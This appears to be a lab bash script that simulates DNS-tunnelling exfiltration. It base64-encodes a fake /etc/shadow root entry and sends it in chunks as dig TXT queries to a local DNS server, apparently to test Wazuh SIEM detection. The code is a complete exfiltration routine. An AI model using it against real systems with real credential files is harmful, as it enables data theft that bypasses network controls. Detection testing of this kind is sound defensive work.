#!/bin/bash
TARGET_IP="192.168.56.20"
DOMAIN="altay.local"

echo "[*] Starting DNS Tunneling Data Exfiltration simulation..."

FAKE_SHADOW="root:\$6\$xyz123\$fakehash...:19200:0:99999:7:::"
ENCODED_DATA=$(echo -n "$FAKE_SHADOW" | base64 | tr -d '\n')

echo "[*] Data to exfiltrate: $FAKE_SHADOW"
echo "[*] Base64 encoded payload: $ENCODED_DATA"

CHUNK_SIZE=10
LENGTH=${#ENCODED_DATA}

for (( i=0; i<$LENGTH; i+=$CHUNK_SIZE )); do
    CHUNK=${ENCODED_DATA:$i:$CHUNK_SIZE}
    echo "[-] Sending chunk: $CHUNK"
    dig @$TARGET_IP TXT "${CHUNK}.${DOMAIN}" +short > /dev/null
    sleep 1
done

echo "[*] Simulation complete. Check Wazuh SIEM for suspicious DNS queries."
